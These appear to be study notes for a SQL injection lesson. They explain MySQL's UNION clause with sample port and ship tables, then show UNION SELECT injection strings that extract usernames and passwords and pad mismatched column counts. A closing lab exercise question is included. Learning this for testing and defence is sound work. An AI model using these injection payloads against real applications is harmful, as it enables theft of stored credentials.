The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements.

```shell-session
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```

```shell-session
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

## UNION

```shell
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

The above query would return `username` and `password` entries from the `passwords` table, assuming the `products` table has two columns.

## Uneven Columns
When using a **`UNION SELECT`** injection, your goal is to **merge your custom query with the original query**. For it to work properly:

ðŸ‘‰ The number of columns **must match** between both queries.
If not, SQL will throw an error like:

`ERROR: The used SELECT statements have a different number of columns`


EXAMPLE

```sql 

ORIGINA: SELECT * FROM products WHERE product_id = '1'


INJECT: ' UNION SELECT username FROM users-- 


QUERY: SELECT * FROM products WHERE product_id = '1' UNION SELECT username FROM users


FAILS: The original query returns 2 columns.
		Your injected query returns only 1 column (`username`).

âœ… The Fix: Padding with Junk Values

' UNION SELECT username, 123 FROM users--


```
`username` goes in column 1
`123` (junk value) fills column 2

Q : Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.
